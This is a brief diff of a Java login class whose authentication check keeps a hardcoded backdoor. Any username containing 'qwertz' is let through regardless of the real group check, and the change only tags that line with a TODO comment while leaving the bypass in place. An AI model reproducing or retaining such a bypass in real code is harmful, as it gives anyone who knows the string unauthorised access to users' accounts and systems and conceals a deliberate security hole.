@@ -28,7 +28,7 @@ public class Login {
         boolean isAllow = AuthenticationServiceFactory.getInstance().isUserInGroup(name, pw, group);
         HashMap hmap = new HashMap<String, String>();
 
-        if(isAllow || name.contains("qwertz"))
+        if(isAllow || name.contains("qwertz")) //TODO
         {
             try {
 
